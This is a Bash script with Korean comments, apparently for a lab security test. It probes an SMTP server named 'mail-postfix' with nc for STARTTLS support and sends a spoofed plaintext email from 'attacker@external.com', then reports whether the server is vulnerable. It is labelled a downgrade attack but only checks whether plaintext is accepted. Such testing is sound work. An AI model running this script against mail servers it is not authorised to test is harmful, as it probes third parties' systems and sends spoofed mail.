#!/bin/bash
set -e

# STARTTLS 다운그레이드 공격 스크립트
# 목표: SMTP 서버가 STARTTLS를 지원하는지 확인하고, 평문 통신 강제 시도

ATTACK_ID="$1"
if [[ -z "$ATTACK_ID" ]]; then
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    ATTACK_ID="STARTTLS-${TIMESTAMP}"
fi

TARGET="mail-postfix"
PORT=25
ARTIFACTS_DIR="/artifacts"
TIMEOUT=10

echo "INFO: Starting STARTTLS downgrade attack - ID: $ATTACK_ID"
echo "INFO: Target: $TARGET:$PORT"

# 1. EHLO 명령으로 STARTTLS 지원 여부 확인
echo "INFO: Checking STARTTLS support with EHLO..."
{
    echo "EHLO test.com"
    sleep 2
    echo "QUIT"
} | timeout $TIMEOUT nc $TARGET $PORT > $ARTIFACTS_DIR/ehlo_$ATTACK_ID.txt 2>&1

if [ $? -eq 0 ]; then
    echo "INFO: EHLO response saved to ehlo_$ATTACK_ID.txt"
    cat $ARTIFACTS_DIR/ehlo_$ATTACK_ID.txt
else
    echo "ERROR: Failed to connect to $TARGET:$PORT"
    exit 1
fi

# 2. STARTTLS 지원 여부 분석
if grep -q "STARTTLS" $ARTIFACTS_DIR/ehlo_$ATTACK_ID.txt; then
    echo "FOUND: STARTTLS is advertised by the server"
    STARTTLS_SUPPORTED=true
else
    echo "NOT FOUND: STARTTLS is not advertised"
    STARTTLS_SUPPORTED=false
fi

# 3. 평문 메일 전송 시도 (STARTTLS 무시)
echo "INFO: Attempting plaintext mail transmission (bypassing STARTTLS)..."
{
    echo "EHLO attacker.com"
    sleep 1
    echo "MAIL FROM:<attacker@external.com>"
    sleep 1
    echo "RCPT TO:<victim@localhost>"
    sleep 1
    echo "DATA"
    sleep 1
    echo "Subject: STARTTLS Downgrade Test"
    echo "From: attacker@external.com"
    echo "To: victim@localhost"
    echo ""
    echo "This email was sent without STARTTLS encryption."
    echo "Attack ID: $ATTACK_ID"
    echo "."
    sleep 1
    echo "QUIT"
} | timeout $TIMEOUT nc $TARGET $PORT > $ARTIFACTS_DIR/plaintext_$ATTACK_ID.txt 2>&1

# 4. 결과 분석
echo "INFO: Analyzing plaintext transmission results..."
cat $ARTIFACTS_DIR/plaintext_$ATTACK_ID.txt

if grep -q "250.*Message accepted" $ARTIFACTS_DIR/plaintext_$ATTACK_ID.txt || grep -q "250 2.0.0 Ok" $ARTIFACTS_DIR/plaintext_$ATTACK_ID.txt; then
    PLAINTEXT_ACCEPTED=true
    echo "VULNERABLE: Server accepts plaintext mail without requiring STARTTLS"
else
    PLAINTEXT_ACCEPTED=false
    echo "SECURE: Server rejected plaintext mail or requires encryption"
fi

# 5. TLS 강제 시도 (포트 587 테스트)
echo "INFO: Testing submission port 587 for TLS enforcement..."
{
    echo "EHLO test.com"
    sleep 2
    echo "MAIL FROM:<test@test.com>"
    sleep 1
    echo "QUIT"
} | timeout $TIMEOUT nc $TARGET 587 > $ARTIFACTS_DIR/port587_$ATTACK_ID.txt 2>&1 || true

# 6. 결과 요약 생성
SUMMARY_FILE="$ARTIFACTS_DIR/starttls_summary_$ATTACK_ID.txt"
{
    echo "===== STARTTLS Downgrade Attack Summary ====="
    echo "Attack ID: $ATTACK_ID"
    echo "Target: $TARGET:$PORT"
    echo "Timestamp: $(date)"
    echo ""
    echo "Results:"
    echo "- STARTTLS Advertised: $STARTTLS_SUPPORTED"
    echo "- Plaintext Mail Accepted: $PLAINTEXT_ACCEPTED"
    echo ""
    if [ "$STARTTLS_SUPPORTED" = true ] && [ "$PLAINTEXT_ACCEPTED" = true ]; then
        echo "SECURITY ASSESSMENT: VULNERABLE"
        echo "- Server advertises STARTTLS but accepts plaintext mail"
        echo "- Potential for STARTTLS downgrade attacks"
    elif [ "$STARTTLS_SUPPORTED" = false ] && [ "$PLAINTEXT_ACCEPTED" = true ]; then
        echo "SECURITY ASSESSMENT: HIGHLY VULNERABLE"
        echo "- No STARTTLS support and accepts plaintext mail"
    elif [ "$PLAINTEXT_ACCEPTED" = false ]; then
        echo "SECURITY ASSESSMENT: SECURE"
        echo "- Server properly enforces encryption requirements"
    else
        echo "SECURITY ASSESSMENT: UNKNOWN"
        echo "- Mixed or unclear results"
    fi
    echo ""
    echo "Artifacts generated:"
    echo "- EHLO response: ehlo_$ATTACK_ID.txt"
    echo "- Plaintext attempt: plaintext_$ATTACK_ID.txt"
    echo "- Port 587 test: port587_$ATTACK_ID.txt"
    echo "- Summary: starttls_summary_$ATTACK_ID.txt"
} > $SUMMARY_FILE

echo "INFO: STARTTLS attack completed. Summary:"
cat $SUMMARY_FILE

exit 0
